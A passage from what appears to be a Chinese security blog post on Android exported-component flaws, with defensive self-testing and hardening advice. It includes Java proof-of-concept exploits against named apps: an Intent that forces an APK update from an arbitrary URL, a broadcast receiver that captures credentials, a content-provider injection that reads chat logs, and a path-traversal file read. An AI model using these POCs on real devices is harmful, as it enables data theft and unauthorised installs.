<h6 id="e-g-优酷Android-4-5客户端升级漏洞"><a href="#e-g-优酷Android-4-5客户端升级漏洞" class="headerlink" title="e.g. 优酷Android 4.5客户端升级漏洞"></a>e.g. 优酷Android 4.5客户端升级漏洞</h6><p>com.youku.service.push.StartActivityService组件从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PushMsg pushMsg = new PushMsg();</span><br><span class="line">pushMsg.type = 1;</span><br><span class="line">pushMsg.updateurl = &quot;http://**.**.**.**/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;;</span><br><span class="line">pushMsg.updatecontent = &quot;This is Fake&quot;;</span><br><span class="line">Intent intent = new Intent();</span><br><span class="line">intent.setClassName(&quot;com.youku.phone&quot;,&quot;com.youku.service.push.StartActivityService&quot;);</span><br><span class="line">intent.putExtra(&quot;PushMsg&quot;, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>

<h4 id="4、敏感信息泄漏"><a href="#4、敏感信息泄漏" class="headerlink" title="4、敏感信息泄漏"></a>4、敏感信息泄漏</h4><h6 id="e-g-某应用隐式intent发送敏感信息"><a href="#e-g-某应用隐式intent发送敏感信息" class="headerlink" title="e.g. 某应用隐式intent发送敏感信息"></a>e.g. 某应用隐式intent发送敏感信息</h6><p>缺陷代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class ServerService extends Service &#123;</span><br><span class="line">  private void d() &#123;</span><br><span class="line">    Intent v1 = new Intent();</span><br><span class="line">    v1.setAction(&quot;com.sample.action.server_running&quot;);</span><br><span class="line">    v1.putExtra(&quot;local_ip&quot;, v0.h);</span><br><span class="line">    v1.putExtra(&quot;port&quot;, v0.i);</span><br><span class="line">    v1.putExtra(&quot;code&quot;, v0.g);</span><br><span class="line">    v1.putExtra(&quot;connected&quot;, v0.s);</span><br><span class="line">    v1.putExtra(&quot;pwd_predefined&quot;, v0.r);</span><br><span class="line">    if (!TextUtils.isEmpty(v0.t)) &#123;</span><br><span class="line">      v1.putExtra(&quot;connected_usr&quot;, v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  this.sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class BcReceiv extends BroadcastReceiver &#123;</span><br><span class="line">  @Override</span><br><span class="line">  public void onReceive(Context context, Intent intent)&#123;</span><br><span class="line">    String s = null;</span><br><span class="line">    if (intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123;</span><br><span class="line">      String pwd = intent.getStringExtra(&quot;connected&quot;);</span><br><span class="line">      s = &quot;Airdroid  =&gt; [&quot; + pwd + &quot;]/&quot; + intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeText(context, String.format(&quot;%s Received&quot;, s),</span><br><span class="line">                   Toast.LENGTH_SHORT).show();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="5、提升权限"><a href="#5、提升权限" class="headerlink" title="5、提升权限"></a>5、提升权限</h4><h6 id="e-g-某系统清理工具"><a href="#e-g-某系统清理工具" class="headerlink" title="e.g. 某系统清理工具"></a>e.g. 某系统清理工具</h6><p>暴露了com.cleanmaster.appwidget.WidgetService服务组件，当向此服务发送action为com.cleanmaster.appwidget.ACTION_FASTCLEAN的intent时，便可结束后台运行的一些app进程<br><img lazyload src="/images/loading.svg" data-src="15190503814605.png"></p>
<h4 id="6、Content-Provider-暴露泄露敏感信息"><a href="#6、Content-Provider-暴露泄露敏感信息" class="headerlink" title="6、Content Provider 暴露泄露敏感信息"></a>6、Content Provider 暴露泄露敏感信息</h4><p>Content Provider 用来存放和获取数据并使这些数据可以被所有的应用程序访问，是应用程序之间共享数据的唯一方法</p>
<h6 id="e-g-一只眼app应用本地信息泄露"><a href="#e-g-一只眼app应用本地信息泄露" class="headerlink" title="e.g. 一只眼app应用本地信息泄露"></a>e.g. 一只眼app应用本地信息泄露</h6><p>任意Android程序不需要任何权限就能获取本机一支眼app的所有数据，包括账号、私信聊天记录</p>
<p>查看聊天记录POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public void getChatMsg() &#123;</span><br><span class="line">    	String[] projection = &#123;&quot;* from im_message_table--&quot;&#125;;</span><br><span class="line">    	Uri uri = Uri.parse(&quot;content://com.sina.weibo.blogProvider/query/im&quot;);</span><br><span class="line">    	Cursor mCursor = getContentResolver().query(uri, projection, null, null, null);</span><br><span class="line">    	if (null == mCursor) &#123;</span><br><span class="line">    		Toast.makeText(mContext, &quot;null cursor&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">    	&#125; else if (mCursor.getCount() &lt; 1) &#123;</span><br><span class="line">    		Toast.makeText(mContext, &quot;count less than 1&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">    	&#125; else &#123;</span><br><span class="line">    		String text = &quot;&quot;;</span><br><span class="line">    		while (mCursor.moveToNext()) &#123;</span><br><span class="line">    	        text += mCursor.getString(mCursor.getColumnIndex(&quot;content&quot;));</span><br><span class="line">    	    &#125;</span><br><span class="line">    		mTextView.setText(text);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="7、任意文件读取漏洞"><a href="#7、任意文件读取漏洞" class="headerlink" title="7、任意文件读取漏洞"></a>7、任意文件读取漏洞</h4><h6 id="e-g-某客户端Content-Provider组件任意文件读取漏洞"><a href="#e-g-某客户端Content-Provider组件任意文件读取漏洞" class="headerlink" title="e.g. 某客户端Content Provider组件任意文件读取漏洞"></a>e.g. 某客户端Content Provider组件任意文件读取漏洞</h6><p>某客户端APP的实现中定义了一个可以访问本地文件的Content Provider组件，默认的android:exported=”true”,对应com.ganji.android.jobs.html5.LocalFileContentProvider，该Provider实现了openFile()接口，通过此接口可以访问内部存储app_webview目录下的数据，由于后台未能对目标文件地址进行有效判断，可以通过”../“实现目录跨越，实现对任意私有数据的访问</p>
<p>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public void GJContentProviderFileOperations()&#123; </span><br><span class="line">    try&#123; </span><br><span class="line">	    InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.ganji.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); </span><br><span class="line">		ByteArrayOutputStream out = new ByteArrayOutputStream(); </span><br><span class="line">		byte[] buffer = new byte[1024]; </span><br><span class="line">		int n = in.read(buffer); </span><br><span class="line">		while(n&gt;0)&#123; </span><br><span class="line">		    out.write(buffer, 0, n); </span><br><span class="line">			n = in.read(buffer); </span><br><span class="line">			Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); </span><br><span class="line">	    &#125; </span><br><span class="line">	&#125;catch(Exception e)&#123; </span><br><span class="line">	    debugInfo(e.getMessage()); </span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a class="link" target="_blank" rel="noopener" href="https://jaq.alibaba.com/blog.htm?id=61">漏洞详解<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）"><a href="#8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）" class="headerlink" title="8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）"></a>8、启动私有组件（这就是前边提到的，私有组件也仅仅是相对安全的）</h4><p>存在一个私有组件A，和一个对外导出组件B。如果B能够根据对外传入的Intent中的内容打开私有组件A，同时启动私有组件A的Intent的内容来自启动导出组件B的Intent的内容，那么攻击者就可以通过对外导出组件B，去控制私有导出组件A。这就可能会造成严重的安全风险<br><a class="link" target="_blank" rel="noopener" href="https://jaq.alibaba.com/community/art/show?articleid=834">这里详细的看下聚安全的这篇paper<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="其实还有很多没有列出，如UXSS、界面劫持、services劫持等等"><a href="#其实还有很多没有列出，如UXSS、界面劫持、services劫持等等" class="headerlink" title="其实还有很多没有列出，如UXSS、界面劫持、services劫持等等"></a>其实还有很多没有列出，如UXSS、界面劫持、services劫持等等</h4><h3 id="0x04-简单自测"><a href="#0x04-简单自测" class="headerlink" title="0x04 简单自测"></a>0x04 简单自测</h3><h4 id="1、反编译APK或直接查看源代码"><a href="#1、反编译APK或直接查看源代码" class="headerlink" title="1、反编译APK或直接查看源代码"></a>1、反编译APK或直接查看源代码</h4><p>查看AndroidManifest.xml文件，查看哪些组件是导出的，仔细check是否需要导出，需要导出的是否都已做了相应的安全限制</p>
<h4 id="2、drozer扫描"><a href="#2、drozer扫描" class="headerlink" title="2、drozer扫描"></a>2、drozer扫描</h4><p><code>run app.activity.info -a packagename</code></p>
<h3 id="0x05-防患于未然"><a href="#0x05-防患于未然" class="headerlink" title="0x05 防患于未然"></a>0x05 防患于未然</h3><p>1、能不导出组件的坚决不导出<br>2、必须导出的组件仔细check限制策略是否到位<br>3、检查该组件能不能根据该组件的intent去启动其他私有组件<br>4、如果能启动私有组件，根据业务严格控制过滤和校验intent中的内容，同时被启动的私有组件需要做好各种安全防范</p>
<blockquote>
<blockquote>
<p>关于漏洞例子：本来想用最近遇到的问题来做实例，但考虑到漏洞的敏感性，找的是网上公开的漏洞</p>
</blockquote>
</blockquote>

                </div>

                <div class="home-article-meta-info-container">
    <div class="home-article-meta-info">
        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Jun 19 2017 21:00:00 GMT+0800">2017-06-19</span></span>
        
            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/">移动安全</a>&nbsp;
                        </li>
                    
                    
                </ul>
            </span>
        
        
            <span class="home-article-tag">
                <i class="fas fa-tags"></i>&nbsp;
                <ul>
                    
                        <li>
                            
                            <a href="/tags/Mobi/">Mobi</a>&nbsp;
                        </li>
                    
                </ul>
            </span>
        
    </div>

    <a href="/Android%E7%BB%84%E4%BB%B6%E6%9A%B4%E9%9C%B2%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
</div>

            </li>
        
    </ul>

    <div class="home-paginator">
        <div class="paginator">
    
        <a class="prev btn"
           href="/page/8/"
        >Prev</a>
    

    
        <a class="next btn"
           href="/page/10/"
        >Next</a>
    
</div>

    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2016</span>&nbsp;-&nbsp;
            
            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
        </div>
        <!--
            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        -->
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
        </div>
        
    </div>
</footer>

        </div>
    </div>

    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    

    <div class="image-viewer-container">
    <img src="">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>





<script src="/js/utils.js"></script>

<script src="/js/main.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/dark-light-toggle.js"></script>



    
<script src="/js/local-search.js"></script>




    
<script src="/js/code-copy.js"></script>




    
<script src="/js/lazyload.js"></script>



<div class="post-scripts pjax">
    
</div>


    
<script src="/js/libs/pjax.min.js"></script>

<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
